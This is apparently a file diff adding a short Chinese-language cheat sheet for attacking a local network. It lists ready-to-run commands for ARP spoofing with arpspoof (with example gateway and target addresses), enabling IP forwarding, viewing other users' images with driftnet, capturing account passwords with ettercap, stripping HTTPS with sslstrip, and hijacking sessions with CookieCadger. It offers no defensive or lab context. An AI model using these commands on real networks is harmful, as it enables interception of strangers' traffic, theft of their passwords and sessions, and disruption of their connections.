@@ -1,0 +1,12 @@
+１．断网攻击：arpspoof -i 网卡　-t 网关　攻击目标　　　例子：arpspoof -i wlan0 -t 192.168.1.1 192.168.1.101
+
+２．流量转发：echo 1 >/proc/sys/net/ipv4/ip_forward    目的就是将１写入到ip_forward文件中
+
+３．如要查看别人的浏览的图片　driftnet -i wlan0  此命令是查看流过该网卡的图片
+
+４．（http截取）账号密码截取： 启用ettercap     命令：ettercap -Tq -i wlan0     (-T是文本显示　-q是安静模式)
+
+５．https截取：　①　首先，将https传输转换为http传输。	sslstrip -a -f -k
+                 ②　再接着还是设置网卡转发、arp欺骗、网络抓包。这里和上面的http的基本差不多，
+
+6. 回话劫持　：　使用CookieCadger抓包。
